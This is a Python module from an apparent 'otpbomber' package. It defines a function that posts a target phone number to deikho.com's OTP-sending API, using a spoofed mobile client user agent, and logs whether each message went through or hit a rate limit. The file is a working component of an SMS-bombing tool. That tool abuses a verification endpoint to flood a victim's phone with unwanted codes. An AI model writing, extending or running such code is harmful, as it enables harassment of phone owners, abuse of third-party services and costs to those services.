from otpbomber.core import *
from otpbomber.localuseragent import *
from requests_toolbelt.multipart.encoder import MultipartEncoder


async def deikho(phone, client, out):
    name = "deikho"
    domain = "deikho"
    frequent_rate_limit=False
    headers = {
        'User-Agent': 'okhttp/5.0.0-alpha.14',
    }
    m = MultipartEncoder(
        fields={
            'phone': f'92{phone[-10:]}',
        }
    )
    headers['Content-Type'] = m.content_type
    response = await client.post('https://deikho.com/api/sendOtp', headers=headers, data=m)
    try:
        data=response.json()
       
        if data["status"] == True and data["message"] == "Otp sent successfully":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["status"] == False and data["message"] == "":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None